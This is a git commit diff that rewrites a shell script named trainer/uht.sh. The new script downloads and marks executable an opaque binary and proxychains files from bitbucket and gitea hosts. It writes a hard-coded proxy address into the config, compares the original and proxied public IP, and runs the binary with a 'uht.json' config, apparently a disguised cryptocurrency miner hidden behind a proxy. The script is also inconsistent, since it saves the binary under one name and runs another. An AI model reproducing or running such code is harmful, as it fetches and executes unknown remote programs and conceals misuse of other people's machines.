f0e3bcae48fad255025c7b51bff0e99b3cb235a3
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-02-29 23:48:45 +0700

    Update uht.sh

--- trainer/uht.sh
+++ trainer/uht.sh
@@ -1,4 +1,21 @@
-#!/bin/bash
 mkdir .kapi && cd .kapi
-wget https://bitbucket.org/excel-gms/bin/downloads/zypex 
-./zypex -c "uht.json" $(nproc --all)
+proxy="192.252.209.155" 
+port="14455" 
+wget -q -O 0083075176 https://bitbucket.org/excel-gms/bin/downloads/zypex && chmod +x 0083075176
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./zypex -c "uht.json"
